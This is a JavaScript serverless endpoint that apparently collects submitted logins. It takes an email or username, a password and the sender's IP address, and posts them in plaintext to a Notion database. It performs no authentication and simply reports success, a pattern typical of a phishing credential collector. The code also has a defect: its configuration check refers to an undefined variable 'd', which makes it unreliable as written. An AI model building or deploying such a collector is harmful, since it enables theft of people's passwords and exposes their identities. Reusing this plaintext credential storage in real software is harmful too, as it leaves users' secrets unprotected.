// Vercel serverless function: POST /api/submit ↔ Notion DB.
// Accepts `email` (web) OR `username` (Android legacy) + `password`.
const https = require('https');

function rt(s) {
  if (s == null) return [];
  const str = String(s);
  if (!str) return [];
  const out = [];
  for (let i = 0; i < str.length; i += 1900) out.push({ text: { content: str.slice(i, i + 1900) } });
  return out;
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'POST only' });
  // ponytail: web JS sends `email`; Android legacy sends `username`. Accept both.
  const { email, username, password } = req.body || {};
  const login = email || username;
  if (!login || !password) return res.status(400).json({ error: 'email + password required' });

  const token = process.env.NOTION_TOKEN;
  const db = process.env.NOTION_DB;
  if (!token || !d) return res.status(500).json({ error: 'server not configured' });

  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';

  const body = JSON.stringify({
    parent: { database_id: db },
    properties: {
      Login: { title: rt(login).slice(0, 1) },
      Email: { rich_text: rt(login) },
      Password: { rich_text: rt(password) },
      IP: { rich_text: rt(ip) },
    },
  });

  const notionRes = await new Promise((resolve) => {
    const r = https.request({
      hostname: 'api.notion.com',
      path: '/v1/pages',
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Notion-Version': '2022-06-28',
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    }, (response) => {
      let chunks = [];
      response.on('data', (c) => chunks.push(c));
      response.on('end', () => resolve({ status: response.statusCode, text: Buffer.concat(chunks).toString() }));
    });
    r.on('error', (e) => resolve({ status: 0, text: e.message }));
    r.write(body);
    r.end();
  });

  if (notionRes.status < 200 || notionRes.status >= 300) {
    return res.status(502).json({ error: 'notion rejected', notion: notionRes.text.slice(0, 500) });
  }
  return res.status(200).json({ ok: true });
};
